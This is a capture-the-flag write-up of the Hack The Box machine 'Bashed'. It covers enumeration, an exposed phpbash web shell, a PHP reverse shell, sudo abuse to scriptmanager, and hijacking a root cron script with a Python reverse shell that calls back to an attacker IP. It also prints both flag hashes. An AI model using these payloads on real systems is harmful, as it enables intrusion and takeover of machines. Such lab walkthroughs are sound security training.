{"title":"HTB - Bashed","slug":"Bashed","html":"<h1 id=\"bashed---10101068\">Bashed - 10.10.10.68</h1>\n<h1 id=\"enumeration\">Enumeration</h1>\n<h2 id=\"nmap\">Nmap</h2>\n<pre class=\"language-bash\"><code class=\"language-bash\">nmap -sC -sV -oA nmap/initial 10.10.10.68</code></pre><pre class=\"language-bash\"><code class=\"language-bash\">Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-26 05:02 EDT\nNmap scan report for 10.10.10.68\nHost is up (0.24s latency).\nNot shown: 999 closed ports\nPORT   STATE SERVICE VERSION\n80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n|_http-title: Arrexel's Development Site\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 35.45 seconds</code></pre><h2 id=\"gobuster\">Gobuster</h2>\n<p>Enumerating the Apache webserver with gobuster.</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">gobuster dir -t 50 -w /usr/share/seclists/Discovery/Web-Content/common.txt -o log/gobuster.out -u http://10.10.10.68 </code></pre><pre class=\"language-bash\"><code class=\"language-bash\">/.htpasswd            (Status: 403) [Size: 295]\n/.hta                 (Status: 403) [Size: 290]\n/.htaccess            (Status: 403) [Size: 295]\n/css                  (Status: 301) [Size: 308] [--> http://10.10.10.68/css/]\n/dev                  (Status: 301) [Size: 308] [--> http://10.10.10.68/dev/]\n/fonts                (Status: 301) [Size: 310] [--> http://10.10.10.68/fonts/]\n/images               (Status: 301) [Size: 311] [--> http://10.10.10.68/images/]\n/index.html           (Status: 200) [Size: 7743]\n/js                   (Status: 301) [Size: 307] [--> http://10.10.10.68/js/]\n/php                  (Status: 301) [Size: 308] [--> http://10.10.10.68/php/]\n/server-status        (Status: 403) [Size: 299]\n/uploads              (Status: 301) [Size: 312] [--> http://10.10.10.68/uploads/]</code></pre><h2 id=\"website\">Website</h2>\n<p><img src=\"Bashed.assets/image-20210426050746209.png\" alt=\"\"></p>\n<p>The github link, <a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/Arrexel/phpbash\">https://github.com/Arrexel/phpbash</a> reveals partial code of the website.</p>\n<p><img src=\"Bashed.assets/image-20210426051313928.png\" alt=\"\"></p>\n<p><img src=\"Bashed.assets/image-20210426051347480.png\" alt=\"\"></p>\n<p><img src=\"Bashed.assets/image-20210426051413896.png\" alt=\"\"></p>\n<p>Both files <strong><a target=\"_blank\" rel=\"nofollow\" href=\"http://10.10.10.68/dev/phpbash.php\">phpbash.php</a></strong> and <strong><a target=\"_blank\" rel=\"nofollow\" href=\"http://10.10.10.68/dev/phpbash.min.php\">phpbash.min.php</a></strong> looks to be the same as in the github repository. Hence source code is revealed.</p>\n<p>The page <a target=\"_blank\" rel=\"nofollow\" href=\"http://10.10.10.68/dev/phpbash.php\">http://10.10.10.68/dev/phpbash.php</a> is an interactive shell coded in php.</p>\n<p><img src=\"Bashed.assets/image-20210426051717761.png\" alt=\"\"></p>\n<h1 id=\"exploitation\">Exploitation</h1>\n<h3 id=\"getting-a-reverse-shell\">Getting a reverse shell</h3>\n<p>Going to <strong>/dev/shm</strong>, the attacker can upload a reverse shell as normally anyone can write to <strong>/dev/shm</strong>.</p>\n<p><img src=\"Bashed.assets/image-20210426053142178.png\" alt=\"\"></p>\n<p>Normally on kali linux, these are some default location where php reverse shells can be found.</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">$ locate php-reverse                                                                             \n/usr/share/laudanum/php/php-reverse-shell.php\n/usr/share/laudanum/wordpress/templates/php-reverse-shell.php\n/usr/share/seclists/Web-Shells/laudanum-0.8/php/php-reverse-shell.php\n/usr/share/webshells/php/php-reverse-shell.php</code></pre><p><img src=\"Bashed.assets/image-20210426052146005.png\" alt=\"\"></p>\n<p>Editing the php reverse shell to connect to the attacker&#39;s IP address.</p>\n<p><img src=\"Bashed.assets/image-20210426052531204.png\" alt=\"\"></p>\n<p>The attacker then hosts a http server and also setup <strong>nc</strong> to listen for an incoming connection on port <strong>8888</strong>.</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">nc -lvnp 8888\npython3 -m http.server 80  </code></pre><p><img src=\"Bashed.assets/image-20210426053314010.png\" alt=\"\"></p>\n<p><img src=\"Bashed.assets/image-20210426053359115.png\" alt=\"\"></p>\n<p>After running the reverse shell on the server, the attacker gets a <strong>nc</strong> connection.</p>\n<p><img src=\"Bashed.assets/image-20210426053608498.png\" alt=\"\"></p>\n<p>The reverse shell is then stabilised using the following commands.</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">which python # to know which python version exists\npython -c 'import pty;pty.spawn(\"/bin/bash\")' # gets a proper tty shell\n# the shell is then backgrounded using ctrl+z\nstty raw -echo # this is executed on the attackers machine\n# then press fg to resume the tty shell\nexport TERM=xterm # after setting the terminal type, the screen can now be cleared</code></pre><p><img src=\"Bashed.assets/image-20210426053953530.png\" alt=\"\"></p>\n<h2 id=\"privilege-escalation-to-scriptmanager\">Privilege Escalation to scriptmanager</h2>\n<h3 id=\"vulnerability-explanation\"><strong>Vulnerability Explanation:</strong></h3>\n<p>As can be seen below, the user <strong>www-data</strong> can execute any command as the user <strong>scriptmanager</strong> <em>without the need of a password</em></p>\n<p><img src=\"Bashed.assets/image-20210426054917421.png\" alt=\"\"></p>\n<h3 id=\"usertxt\">User.txt</h3>\n<pre class=\"language-bash\"><code class=\"language-bash\">find /home -type f -ls 2>/dev/null</code></pre><p>The above command finds everything having the type <strong>file</strong> in the directory <strong>/home</strong>, as well as listing all the attributes of each file and finally <strong>2&gt;/dev/null</strong> mean to redirect standard error to <strong>/dev/null</strong>.</p>\n<p><img src=\"Bashed.assets/image-20210426060250953.png\" alt=\"\"></p>\n<p><strong>User.txt</strong> can be found in the home directory of <strong>arrexel</strong> and it can be read anyone.</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">cat /home/arrexel/user.txt</code></pre><p><img src=\"Bashed.assets/image-20210426061019511.png\" alt=\"\"></p>\n<blockquote>\n<p>user.txt flag: <code>2c281f318555dbc1b856957c7147bfc1</code></p>\n</blockquote>\n<h2 id=\"privilege-escalation-to-root\">Privilege Escalation to Root</h2>\n<h3 id=\"roottxt\">Root.txt</h3>\n<p>The directory <strong>scripts</strong> standards out as it is not an standard directory.</p>\n<p><img src=\"Bashed.assets/image-20210426061419226.png\" alt=\"\"></p>\n<h3 id=\"vulnerability-explanation-1\"><strong>Vulnerability Explanation:</strong></h3>\n<p>Going into the directory <strong>script</strong>, it can be concluded that there has to be a <strong>cronjob</strong> running on the machine as the date created of the file <strong>test.txt</strong> keeps changing <strong>every minute</strong>.</p>\n<p><img src=\"Bashed.assets/image-20210426061811213.png\" alt=\"\"></p>\n<p>Since the script <strong>test.py</strong> is owned by <strong>scriptmanager</strong> and it is writing to the file <strong>test.txt</strong> as root. It can be said that the attacker can modify the script and it will be ran as root.</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">cat test.py</code></pre><pre class=\"language-python\"><code class=\"language-python\">f = open(\"test.txt\", \"w\")\nf.write(\"testing 123!\")\nf.close</code></pre><p>RSG is used to generate a reverse shell in python and it also listens on the port specified. After adding the selected payload to the file <strong>test.py</strong>, it will be executed by the cronjob when it runs.</p>\n<pre class=\"language-python\"><code class=\"language-python\">import socket,subprocess,os\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect((\"10.10.14.23\",8888))\nos.dup2(s.fileno(),0); os.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/sh\")\nf = open(\"test.txt\", \"w\")\nf.write(\"testing 123!\")\nf.close</code></pre><p><img src=\"Bashed.assets/image-20210426063556805.png\" alt=\"\"></p>\n<p>As soon as the <strong>cronjab</strong> executes, the attacker gets a reverse shell from the machine bashed.</p>\n<p><img src=\"Bashed.assets/image-20210426064607146.png\" alt=\"\"></p>\n<p>the <strong>root.txt</strong> file is always located in <strong>/root/</strong></p>\n<pre class=\"language-bash\"><code class=\"language-bash\">cat /root/root.txt</code></pre><p><img src=\"Bashed.assets/image-20210426065148940.png\" alt=\"\"></p>\n<blockquote>\n<p>root.txt flag: <code>cc4f0afe3a1026d402ba10329674a8e2</code></p>\n</blockquote>\n","date":"2021-04-26","excerpt":"","printDate":"April 26, 2021","printReadingTime":"4 min read"}